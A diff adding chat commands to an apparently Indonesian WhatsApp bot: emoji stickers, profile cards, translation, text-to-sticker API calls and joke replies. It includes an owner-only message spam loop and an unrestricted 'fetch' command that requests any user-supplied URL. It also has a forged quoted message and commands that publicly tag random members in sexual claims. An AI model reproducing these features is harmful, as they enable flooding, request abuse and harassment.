+                   txt += `*ID :* ${i.id}\n*Expired :* ${cekvip.days} Hari ${cekvip.hours} Jam ${cekvip.minutes} Menit ${cekvip.seconds} Detik\n\n`
+                   }
+                   setReply(txt, men, true)
+                   break
+                   
+                   case 'emoji':
+                      if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+                      if (args.length == 0) return setReply(`Example: ${prefix + command} wa 🗿
+
+*LIST EMOJI*
+
+code: ap
+vendor: Apple
+      
+code: go
+vendor: Google
+      
+code: sa
+vendor: Samsung
+      
+code: ms
+vendor: Microsoft
+      
+code: wa
+vendor: WhatsApp
+      
+code: tw
+vendor: Twitter
+      
+code: fb
+vendor: Facebook
+      
+code: jp
+vendor: JoyPixels
+     
+code: op
+vendor: OpenMoji
+      
+code: od
+vendor: emojidex
+      
+code: mes
+vendor: Messenger
+      
+code: lg
+vendor: logitech
+    
+code: htc
+vendor: HTC
+      
+code: mo
+vendor: Mozilla
+      
+code: sb
+vendor: SoftBank
+      
+code: dm
+vendor: Docomo
+      
+code: au
+vendor: auKDDI
+
+penggunaan : ${prefix + command } wa 🗿`)
+                     emojis = args[0]
+                     args.shift()
+                     emoje = args.join(" ")
+                     setReply(mess.wait)
+                     limitAdd(senderNumber, user)
+                     switch (emojis) {
+               case 'ap':
+               case 'apple':
+			             emoji.get(`${emoje}`).then(emoji => {
+				         teks = `${emoji.images[0].url}`
+    	         		sendStickerUrl(from,`${teks}`)	
+             			console.log(teks)
+   	  	     		})
+                        break
+              case 'go':
+              case 'google':
+                     emoji.get(`${emoje}`).then( emoji => {
+				     teks = `${emoji.images[1].url}`
+    	   	  	sendStickerUrl(from,`${teks}`)	
+    	   	  	console.log(teks)
+   			  	})
+                     break
+              case 'sa':
+            case 'samsung':
+                    emoji.get(`${emoje}`).then(emoji => {
+				    teks = `${emoji.images[2].url}`
+       	 		sendStickerUrl(from,`${teks}`)	
+        			console.log(teks)
+   	 			})
+                   break
+            case 'ms':
+            case 'microsoft':
+                    emoji.get(`${emoje}`).then(emoji => {
+				    teks = `${emoji.images[3].url}`
+       	 		sendStickerUrl(from,`${teks}`)	
+        			console.log(teks)
+   	 			})
+                   break
+              case 'wa':
+              case 'whatsapp':
+                         emoji.get(`${emoje}`).then(emoji => {
+				         teks = `${emoji.images[4].url}`
+      	       		sendStickerUrl(from,`${teks}`)	
+    		         	console.log(teks)
+   		     	 	})
+                         break
+                         
+               case 'tw':
+                  emoji.get(`${emoje}`).then(emoji => {
+				  teks = `${emoji.images[5].url}`
+    	  		sendStickerUrl(from,`${teks}`)	
+      			console.log(teks)
+   				})
+                  break
+                  
+              case 'fb':
+              case 'facebook':
+                        emoji.get(`${emoje}`).then(emoji => {
+				        teks = `${emoji.images[6].url}`
+          	  		sendStickerUrl(from,`${teks}`)	
+    	        		console.log(teks)
+        				})
+                        break
+               case 'jp':
+              case 'joypixel':
+                        emoji.get(`${emoje}`).then(emoji => {
+				        teks = `${emoji.images[7].url}`
+          	  		sendStickerUrl(from,`${teks}`)	
+    	        		console.log(teks)
+        				})
+                        break
+              case 'om':
+              case 'openmoji':
+                        emoji.get(`${emoje}`).then(emoji => {
+				        teks = `${emoji.images[8].url}`
+          	  		sendStickerUrl(from,`${teks}`)	
+    	        		console.log(teks)
+        				})
+                        break
+               case 'od':
+              case 'emojidex':
+                        emoji.get(`${emoje}`).then(emoji => {
+				        teks = `${emoji.images[9].url}`
+          	  		sendStickerUrl(from,`${teks}`)	
+    	        		console.log(teks)
+        				})
+                        break
+               case 'mes':
+              case 'messenger':
+                        emoji.get(`${emoje}`).then(emoji => {
+				        teks = `${emoji.images[10].url}`
+          	  		sendStickerUrl(from,`${teks}`)	
+    	        		console.log(teks)
+        				})
+                        break
+              case 'lg':
+              case 'logitech':
+                        emoji.get(`${emoje}`).then(emoji => {
+				        teks = `${emoji.images[11].url}`
+          	  		sendStickerUrl(from,`${teks}`)	
+    	        		console.log(teks)
+        				})
+                        break
+             case 'htc':
+              
+                        emoji.get(`${emoje}`).then(emoji => {
+				        teks = `${emoji.images[12].url}`
+          	  		sendStickerUrl(from,`${teks}`)	
+    	        		console.log(teks)
+        				})
+                        break
+                        
+                        
+              
+           case 'mo':
+           case 'mozila':
+                     emoji.get(`${emoje}`).then(emoji => {
+				     teks = `${emoji.images[13].url}`
+    			     sendStickerUrl(from,`${teks}`)	
+    		     	console.log(teks)
+   		      	})
+                     break
+             
+             case 'sb':
+           case 'softbank':
+                     emoji.get(`${emoje}`).then(emoji => {
+				     teks = `${emoji.images[14].url}`
+    			     sendStickerUrl(from,`${teks}`)	
+    		     	console.log(teks)
+   		      	})
+                     break
+           case 'dm':
+           case 'docomo':
+                     emoji.get(`${emoje}`).then(emoji => {
+				     teks = `${emoji.images[15].url}`
+    			     sendStickerUrl(from,`${teks}`)	
+    		     	console.log(teks)
+   		      	})
+                     break
+          case 'au':
+           case 'aukddi':
+                     emoji.get(`${emoje}`).then(emoji => {
+				     teks = `${emoji.images[16].url}`
+    			     sendStickerUrl(from,`${teks}`)	
+    		     	console.log(teks)
+   		      	})
+                     break            
+                   }
+                   break
+                   
+                 
+
+
+  
+                   
+                   
+           case 'claim':   
+           case 'klaim':
+              if (checkClaim(senderNumber, _claim)) return setReply(mess.claimOn)
+                    var htgm6 = randomNomor(2500)
+                    var htgm7 = randomNomor(20)
+                    addBalance(senderNumber, htgm6, user)
+                    giveLimit(sender, htgm7, user)
+                    addUserClaim("1d", timeWib, pushname, senderNumber, _claim)
+                    await setReply(`*── 「 CLAIM  」 ──*
+
+Selamat kamu mendapatkan *${htgm7}* Limit & Uang Rp *${htgm6}* 
+Dari claim harian`)
+                    break
+			
+			
+			
+			
+			
+			
+			
+			
+                   
+                   
+                   
+                   
+                   
+        case 'cekprem': case 'cekpremium':
+                   if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
+                   let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
+                   let premiumnya = `${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)`
+                   try {
+                   ppimg = await xdev.getProfilePicture(`${sender.split('@')[0]}@c.us`)
+                   } catch {
+                   ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
+                   }
+                   teks = `❒ *「 Premium User 」* ❒ 
+  
+ *Nama : ${pushname}*
+ *Tag : @${sender.split("@")[0]}*
+ *Expired : ${premiumnya}*`
+                    its = await getBuffer (ppimg)
+                    xdev.sendMessage(from, its, image, {contextInfo: forward, caption: teks
+                     })
+                     break
+                     
+                     
+           
+           
+           
+           
+           
+           
+case 'me': 
+case 'profile':
+case 'myprofile':
+try {
+ppimg = await xdev.getProfilePicture(`${sender.split('@')[0]}@c.us`)
+} catch {
+ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
+}
+stst = await xdev.getStatus(`${sender.split('@')[0]}@c.us`)
+stst = stst.status == 401 ? '' : stst.status
+let cekprm = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
+hituser = gethitUser(senderNumber, user)
+persenya =`${userPersen}`
+nana =`${userExp}/${requiredExp}`
+if(isOwner){
+	 prmm = isPremium ? `Unlimited`:'Not Premium'
+	} else {
+      prmm = isPremium ? `${cekprm.days} Hari ${cekprm.hours} Jam ${cekprm.minutes} Menit ${cekprm.seconds} Detik`:'Not Premium'
+ }
+ 
+teks = `*]────「 Profile User 」────[*
+
+🆔 Nama : ${pushname} 
+💳 Saldo  : Rp ${getBalance(senderNumber, user).toLocaleString()}
+✅ Verified : ${userVerified}
+📇 Status : ${isPremium ? 'Premium':'Free'}
+🧬 Level : ${userLevel}
+🔰 Pangkat : ${userLeveling(userLevel)}
+⚡ Exp :  ${userXp(userPersen)} ${persenya.split(".")[0]}%
+♻️ Total Exp : ${nana}
+📟 User Hit : ${hituser}
+🤖 Status Bot : ${isOwner ? 'Owner':'User'}
+🕔 Expired : ${prmm}
+📉 Limit : ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}
+📈 Limit Game : ${cekGLimit(senderNumber, gcount, user)}/${gcount}
+📲 No : wa.me/${sender.split("@")[0]}
+🧸 Bio : ${stst}`
+
+
+its = await getBuffer (ppimg)
+
+butprofile = [{ buttonId: `${prefix}shop`, buttonText: { displayText: `sʜᴏᴘ` }, type: 1 },{ buttonId: `${prefix}claim`, buttonText: { displayText: `ᴄʟᴀɪᴍ` }, type: 1 } ];         
+buttonMessage = {
+contentText: teks,
+footerText: copyright,
+buttons: butprofile,
+headerType: 1,
+}
+xdev.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : `${getBalance(senderNumber, user)}`, status: 1,surface : 2,message: `${pushname}\n${stst}`,orderTitle: `${stst}`,thumbnail: its, sellerJid: `0@s.whatsapp.net`}}}})
+break 
+           
+           
+           
+           
+           
+           
+           
+
+           
+
+           
+           
+           
+           
+           
+           
+           
+          
+           
+           
+           
+           
+           case 'tekschat':
+           if(!q) return reply (`Teksnya mana ?\nContoh : ga ada menu bang`)
+           teksChat = `${q}`
+           setReply(`
+Berhasil mengganti teksChat Bot
+jika ada yang command ke bot maka bot
+akan menjawab : ${q}`)
+       break    
+           
+           
+           
+    
+    
+      
+      
+           
+           
+        
+                 
+              
+                 
+                
+            case 'listbadword':
+                let bi = `List badword\n\n`
+                for (let boo of badword){
+                    bi += `- ${boo}\n`
+                }
+                bi += `\nTotal : ${badword.length}`
+                setReply(bi)
+                break
+            
+           
+					
+					
+					
+           
+           
+          
+
+           
+           
+           
+
+
+
+ 
+ 
+ 
+           
+           
+           
+           
+           
+           
+					
+					
+					
+					
+           case 'kbbi':
+					if (args.length < 1) return setReply('Apa yang mau dicari um?')
+					asw = await fetchJson(`https://mnazria.herokuapp.com/api/kbbi?search=${body.slice(6)}`, {method: 'get'})
+					setReply('Menurut Kbbi:\n\n'+asw.result)
+					break
+           
+           
+           
+                
+           
+           
+           
+           
+           
+          
+           
+           
+           
+
+
+   
+           
+        
+   
+           
+           
+           
+
+           case "astetick":
+    case "videoanime":
+    case "storyanime":
+    setReply(mess.wait)
+     Iki = await getBuffer (`https://megayaa.herokuapp.com/api/randomaesthetic`)
+     xdev.sendMessage(from, Iki, video, {quoted: dev })
+     break
+           
+           
+           
+           
+           
+           
+           
+           
+           case 'spam':
+				if (!isOwner && !dev.key.fromMe) return setReply(mess.only.ownerB)
+					if (!arg) return setReply(`Penggunaan ${prefix}spam teks|jumlah`)
+				argzi = arg.split("|")
+				if (!argzi) return setReply(`Penggunaan ${prefix}spam teks|jumlah`)
+				if (Number(argzi[1]) >= 50) return setReply('Kebanyakan!')
+				if (isNaN(argzi[1])) return setReply(`harus berupa angka`)
+				for (let i = 0; i < argzi[1]; i++){
+					xdev.sendMessage(from, argzi[0], MessageType.text)
+				}
+				break
+         
+           
+           
+           
+     
+    
+
+      
+           
+           
+                    
+                    
+           
+           
+           
+           
+case 'kodebahasa':
+let LANGUAGES = `
+*╭─❲ KODE BAHASA ❳*
+*│*
+*│▸* af: Afrikaans 
+*│▸* sq: Albanian
+*│▸* ar: Arabic
+*│▸* hy: Armenian
+*│▸* ca: Catalan 
+*│▸* zh: Chinese 
+*│▸* zh-cn: Chinese (Mandarin/China)
+*│▸* zh-tw: Chinese (Mandarin/Taiwan)
+*│▸* zh-yue: Chinese (Cantonese)
+*│▸* hr: Croatian
+*│▸* cs: Czech
+*│▸* da: Danish
+*│▸* nl: Dutch
+*│▸* en: English    
+*│▸* en-au: English (Australia)
+*│▸* en-uk: English (United Kingdom)
+*│▸* en-us: English (United States) 
+*│▸* eo: Esperanto 
+*│▸* fi: Finnish 
+*│▸* fr: French
+*│▸* de: German
+*│▸* el: Greek 
+*│▸* ht: Haitian Creole 
+*│▸* hi: Hindi 
+*│▸* hu: Hungarian 
+*│▸* is: Icelandic 
+*│▸* id: Indonesian 
+*│▸* it: Italian
+*│▸* ja: Japanese
+*│▸* ko: Korean
+*│▸* la: Latin
+*│▸* lv: Latvian
+*│▸* mk: Macedonian
+*│▸* no: Norwegian
+*│▸* pl: Polish
+*│▸* pt: Portuguese
+*│▸* pt-br: Portuguese (Brazil)
+*│▸* ro: Romanian
+*│▸* ru: Russian
+*│▸* sr: Serbian
+*│▸* sk: Slovak
+*│▸* es: Spanish 
+*│▸* es-es: Spanish (Spain)
+*│▸* es-us: Spanish (United States)
+*│▸* sw: Swahili
+*│▸* sv: Swedish
+*│▸* ta: Tamil
+*│▸* th: Thai
+*│▸* tr: Turkish
+*│▸* vi: Vietnamese 
+*│▸* cy: Welsh
+*│*
+*╰────────────⦁*`
+setReply(LANGUAGES)
+break
+           
+           
+       
+           
+         
+        
+           
+           
+
+
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+     
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+case 'translate': case 'tr':
+try {
+if (args.length < 1)return setReply(`Usage : #translate kode bahasa teks/reply pesan\nExample : #translate id why`)
+if (args.length > 1) {
+translate(`${body.slice(10+args[0].length+1)}`, args[0])
+.then((res) => { setReply(`${res}`) })
+} else if(dev.message.extendedTextMessage.contextInfo.quotedMessage.conversation) {
+tolang = args[0]
+entah = dev.message.extendedTextMessage.contextInfo.quotedMessage.conversation
+translate(entah, tolang)
+.then((res) => { setReply(`${res}`) })
+}
+} catch (e) {
+setReply(`${e}`)
+}
+break
+           
+           
+           
+           
+           
+           
+           
+           
+           
+           
+         
+           
+           
+                   
+           
+           
+case 'wiki':
+case 'wikipedia':
+if (args.length < 1) return setReply(' Yang Mau Di Cari Apa? ')
+teks = args.join(' ')
+res = await wikiSearch(teks).catch(e => {
+return setReply('_[ ! ] Error Hasil Tidak Ditemukan_') 
+}) 
+result = `*Judul :* ${res[0].judul}
+*Wiki :* ${res[0].wiki}`
+sendFileFromUrl(res[0].thumb, image, {quoted: dev, caption: result}).catch(e => {
+  setReply(result)
+})
+break
+           
+           
+           
+           
+          
+                
+               
+                    
+		
+           
+           
+                    
+        
+                    
+        
+           
+           
+          
+		
+				
+                
+           
+           
+           
+           
+           
+       
+       case 'loli':
+       case 'milf':
+       case 'husbu':
+       case 'cosplay':
+       case 'wallml':
+         if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
+              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
+              let kentir = await getBuffer(wipi)
+              teks = "Nih"                                          
+		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'🐤OWNER'},type:1}]                            
+              sendButImage(from, teks, copyright, kentir, buttons, {quoted: dev}) 
+              limitAdd(senderNumber, user)
+              break  
+              
+           case 'attp':
+        try {
+
+              if (args.length == 0) return setReply(`Example: ${prefix + command} YUxdev`)
+              buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
+              xdev.sendMessage(from, buffer, sticker, { quoted: dev })
+               } catch (e) {
+               console.log(e)
+               setReply(`Maap sedang error coba lagi besok`)
+              
+}
+              break
+              
+     
+            
+            
+
+	         
+   
+case 'ttp':
+if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
+woy = args.join(" ")
+setReply(mess.wait)
+anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=white`
+sendStickerUrl(from, anjay)
+break
+
+
+case 'ttpred':
+if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
+woy = args.join(" ")
+setReply(mess.wait)
+anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=red`
+sendStickerUrl(from, anjay)
+break
+
+case 'ttpblue':
+if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
+woy = args.join(" ")
+setReply(mess.wait)
+anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=blue`
+sendStickerUrl(from, anjay)
+break
+
+case 'ttpyellow':
+if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
+woy = args.join(" ")
+setReply(mess.wait)
+anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=yellow`
+sendStickerUrl(from, anjay)
+break
+
+case 'ttpgreen':
+if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
+woy = args.join(" ")
+setReply(mess.wait)
+anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=green`
+sendStickerUrl(from, anjay)
+break
+
+case 'ttppurple':
+if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
+woy = args.join(" ")
+setReply(mess.wait)
+anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=purple`
+sendStickerUrl(from, anjay)
+break
+
+case 'ttppink':
+if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
+woy = args.join(" ")
+setReply(mess.wait)
+anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=deeppink`
+sendStickerUrl(from, anjay)
+break
+	
+case 'ttpviolet':
+if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
+woy = args.join(" ")
+setReply(mess.wait)
+anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=violet`
+sendStickerUrl(from, anjay)
+break
+
+case 'ttpmagenta':
+if (args.length < 1) return setReply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
+woy = args.join(" ")
+setReply(mess.wait)
+anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=magenta`
+sendStickerUrl(from, anjay)
+break
+	
+	
+	
+	
+	
+	
+	
+case 'ttp2':                     
+if (!q)return setReply(`Example : ${prefix + command} Senku`)
+buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=white`
+setReply(mess.wait)
+sendStickerUrl(from, buffer)
+break
+
+
+case 'ttp2red':                     
+if (!q)return setReply(`Example : ${prefix + command} Senku`)
+buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=red`
+setReply(mess.wait)
+sendStickerUrl(from, buffer)
+break
+
+case 'ttp2blue':                     
+if (!q)return setReply(`Example : ${prefix + command} Senku`)
+buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=blue`
+setReply(mess.wait)
+sendStickerUrl(from, buffer)
+break
+
+case 'ttp2green':                     
+if (!q)return setReply(`Example : ${prefix + command} Senku`)
+buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=green`
+setReply(mess.wait)
+sendStickerUrl(from, buffer)
+break
+	
+case 'ttp2yellow':                     
+if (!q)return setReply(`Example : ${prefix + command} Senku`)
+buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=yellow`
+setReply(mess.wait)
+sendStickerUrl(from, buffer)
+break
+
+case 'ttp2pink':                     
+if (!q)return setReply(`Example : ${prefix + command} Senku`)
+buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=deeppink`
+setReply(mess.wait)
+sendStickerUrl(from, buffer)
+break
+
+
+case 'ttp2magenta':                     
+if (!q)return setReply(`Example : ${prefix + command} Senku`)
+buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=magenta`
+setReply(mess.wait)
+sendStickerUrl(from, buffer)
+break
+	
+case 'ttp2purple':                     
+if (!q)return setReply(`Example : ${prefix + command} Senku`)
+buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=purple`
+setReply(mess.wait)
+sendStickerUrl(from, buffer)
+break
+
+case 'ttp2violet':                     
+if (!q)return setReply(`Example : ${prefix + command} Senku`)
+buffer = `https://pecundang.herokuapp.com/api/ttpcolor?teks=${q}&color=violet`
+setReply(mess.wait)
+sendStickerUrl(from, buffer)
+break
+	
+	
+	
+	
+	
+	
+	
+	
+case 'ttp3':
+if (!q)return setReply(`Example : ${prefix + command} Senku`)
+buffer = `https://pecundang.herokuapp.com/api/attp?teks=${q}`
+setReply(mess.wait)
+sendStickerUrl(from, buffer)
+break
+
+
+
+     
+
+ case 'get':
+case 'fetch':
+            if(!q) return setReply('Linknya?')
+            fetch(`${args[0]}`).then(res => res.text())  
+            .then(bu =>{
+            setReply(bu)
+            
+            })   
+            break
+        
+        
+
+
+        
+        
+        
+           //By yudha perdana
+           case 'wangy':
+              if (!q) return setReply('query')
+              qq = q.toUpperCase()
+              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
+              xdev.sendMessage(from, awikwok, text)
+              break
+           
+           
+ 
+          
+           
+ 
+           
+           
+         
+
+
+ 
+    
+           
+           
+           
+				
+		
+           
+          
+           
+           
+           
+           
+           
+           case 'jadian':
+           if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+           if(!isGroup) return setReply("Ga mau ah, lu jelek")
+					jds = []
+					const jdii = groupMembers
+					const koss = groupMembers
+					const akuu = jdii[Math.floor(Math.random() * jdii.length)]
+					const diaa = koss[Math.floor(Math.random() * koss.length)]
+					teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]} ❤️ @${diaa.jid.split('@')[0]} `
+					jds.push(akuu.jid)
+					jds.push(diaa.jid)
+					mentions(teks, jds, true)
+					limitAdd(senderNumber, user)
+					break
+	
+case 'ngewe':
+   if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+if(!isGroup) return setReply("Maap om aku masih blom cukup umur")
+					jds = []
+					const jdiid = groupMembers
+					const kosst = groupMembers
+					const akuut = jdiid[Math.floor(Math.random() * jdiid.length)]
+					const diaat = kosst[Math.floor(Math.random() * kosst.length)]
+					teks = `Yang ngewe kemarin di grub ini adalah @${akuut.jid.split('@')[0]} dan @${diaat.jid.split('@')[0]} `
+					jds.push(akuut.jid)
+					jds.push(diaat.jid)
+					mentions(teks, jds, true)
+					limitAdd(senderNumber, user)
+					break
+           
+           
+				
+
+				
+
+			
+
+           
+           case 'memeindo':
+           if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+           data = fs.readFileSync('./lib/game/memeindo.js');
+	       jsonData = JSON.parse(data);
+           randIndex = Math.floor(Math.random() * jsonData.length);
+	       randKey = jsonData[randIndex];        
+           buffer = await getBuffer(randKey.result)
+           xdev.sendMessage(from, buffer, image, {quoted : dev, caption : "Nih"})
+           limitAdd(senderNumber, user)
+           break
+           
+           
+           
+           
+           case 'quotes':
+           data = fs.readFileSync('./lib/game/quotes.js');
+	       jsonData = JSON.parse(data);
+           randIndex = Math.floor(Math.random() * jsonData.length);
+	       randKey = jsonData[randIndex];        
+           quotes = randKey.quotes
+           xdev.sendMessage(from, quotes, text, {quoted : dev})
+           break
+           
+           
+           
+           
+           case 'diem':
+			     if (!isOwner) return onlyOwner()
+			    if (!isGroup) return 
+			if(!checkDataName("mute", from, DataId)) { createDataId("mute", DataId) }
+                if (checkDataId ("mute", from, DataId) ) return setReply(`*aku udah diem nih*`)
+                addDataId(from, "mute", DataId)
+                setReply( `Baik kak 😥 `)
+                break
+                
+                case 'udah':
+      if (!isOwner) return onlyOwner()
+			    if (!isGroup) return 
+               if (!checkDataId ("mute", from, DataId) ) return setReply(`Iya udah*`)
+                removeDataId ("mute", from, DataId)
+                setReply(`Oke kak 😁`)
+            break
+					
+           
+           
+         
+           
+           
+           
+           case 'katailham':  
+                       if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+					const su = ilhamberkata[Math.floor(Math.random() * ilhamberkata.length)]
+					xdev.sendMessage(from, ''+su+'\n\n_-Ilham._', text, { quoted: dev })
+					limitAdd(senderNumber, user)
+					break
+					
+					case 'bucin':
+		            if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+					const sa = ngebucin[Math.floor(Math.random() * ngebucin.length)]
+					xdev.sendMessage(from, ''+sa+'\n\n_-BUCIN._', text, { quoted: dev })
+					limitAdd(senderNumber, user)
+					break
+           
+ case 'bisakah':
+					bisakah = body.slice(1)
+					const bisa =['BISA','Tidak Bisa','Oh tentu saja bisa dong','Udah dari lahir dia bisa kaya gitu kak 😄','Oh tentu saja tidak bisa','Wuih bisa bisa','Ga mao jawab ah lu wibu','Tentu saja bisa eh tapi boong awokawok ','Engga engga dia ga bisa','Enggaklah','Aku ga mao jawbab 🙂','Rahasia dong','Ulangi Tod gua ga paham','Mana gua tau anjir']
+					const keh = bisa[Math.floor(Math.random() * bisa.length)]
+					xdev.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: dev })
+					break
+
+case 'kapankah':
+					kapankah = body.slice(1)
+					const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
+					const koh = kapan[Math.floor(Math.random() * kapan.length)]
+					xdev.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: dev })
+					break
+					
+case 'apakah':
+					apakah = body.slice(1)
+					const apa =['iya dong jelas itu','Tidak lah','Oh tentu saja tidak','Ya mana saya tau kok tanya saya','Rahasia dong','ga usah di tanya emang udah kaya gitu dia','Au ah mending mandi','Bentar aku lagi berak','Knpa emang kamu suka sama dia yak ??','Haha mna mungkin 🤣']
+					const kah = apa[Math.floor(Math.random() * apa.length)]
+					xdev.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: dev })
+					break
+					
+case 'bagaimanakah':
+					bagaimanakah = body.slice(1)
+					const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Gua tabok boleh ?','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan','Hah kamu tanya sama aku trus aku tanya ke siapa dong','Whahahaha ga tau 😑']
+					const mana = bagai[Math.floor(Math.random() * bagai.length)]
+					xdev.sendMessage(from, 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana, text, { quoted: dev })
+					break
+					
+case 'rate':
+					rate = body.slice(1)
+					const ra =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					const te = ra[Math.floor(Math.random() * ra.length)]
+					xdev.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: dev })
+					break
+					
+case 'sangecek':
+					sange = body.slice(1)
+					const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					const nge = sang[Math.floor(Math.random() * sang.length)]
